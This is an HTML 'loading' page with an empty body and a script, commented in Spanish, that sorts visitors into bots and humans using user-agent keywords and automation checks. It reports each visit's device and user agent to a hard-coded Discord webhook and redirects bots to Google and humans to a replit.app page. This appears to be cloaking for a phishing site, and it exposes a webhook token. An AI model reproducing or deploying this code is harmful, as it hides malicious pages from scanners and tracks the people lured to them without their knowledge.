<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Cargando...</title>
    <script>
    (function() {
        // --- CONFIGURACIÓN ---
        // 1. Aquí va tu webhook real:
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546559728786612264/dkFVrRiTobni3TEL9Ko6_nk6VIQQSn2_I8t6gyTXzVuFTi3BAND5J8R-AHYCK_-NNR_6";

        const userAgent = navigator.userAgent.toLowerCase();
        
        // Lista de palabras clave de bots
        const botsKeywords = [
            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
            'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver', 
            'semrushbot', 'ahrefsbot', 'mj12bot', 'petalbot', 'bytespider',
            'spider', 'crawler', 'robot', 'fetch', 'headless', 'python', 'curl'
        ];

        const esBotPorUserAgent = botsKeywords.some(bot => userAgent.includes(bot));

        const esBotPorNavegador = (
            navigator.webdriver === true || 
            window._phantom || 
            window.__nightmare || 
            window.callPhantom ||
            navigator.languages === "" ||
            !navigator.languages
        );

        const esBot = esBotPorUserAgent || esBotPorNavegador;

        // Detección de dispositivo
        let dispositivo = "Escritorio (PC/Laptop)";
        if (/iphone|ipad|ipod/.test(userAgent)) {
            dispositivo = "iOS (iPhone/iPad)";
        } else if (/android/.test(userAgent)) {
            dispositivo = "Android";
        } else if (/mobile/.test(userAgent)) {
            dispositivo = "Dispositivo Móvil";
        }

        function notificarDiscord(esBot, dispositivo, callbackRedireccion) {
            // 2. Comprobación correcta: sólo omitir si está vacío o si NO se ha cambiado el texto genérico
            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("TU_WEBHOOK_URL_AQUÍ")) {
                callbackRedireccion();
                return;
            }

            const payload = {
                embeds: [{
                    title: esBot ? "🤖 Bot Detectado" : "👤 Nueva Visita Real",
                    color: esBot ? 15158332 : 3066993,
                    fields: [
                        { name: "Tipo de Visitante", value: esBot ? "`BOT / Crawler`" : "`Persona Real`", inline: true },
                        { name: "Dispositivo", value: `\`${dispositivo}\``, inline: true },
                        { name: "User-Agent", value: `\`\`\`${navigator.userAgent.substring(0, 500)}\`\`\`` }
                    ],
                    footer: { text: "Notificación de Visita" },
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
                keepalive: true
            }).then(() => {
                callbackRedireccion();
            }).catch(err => {
                console.error("Error enviando a Discord:", err);
                callbackRedireccion();
            });

            setTimeout(callbackRedireccion, 500);
        }

        const urlDestino = esBot 
            ? "https://www.google.com" 
            : "https://web-hola-mundo--johnathanaa0.replit.app/BDV2/";

        notificarDiscord(esBot, dispositivo, function() {
            window.location.replace(urlDestino);
        });
    })();
    </script>
</head>
<body>
</body>
</html>
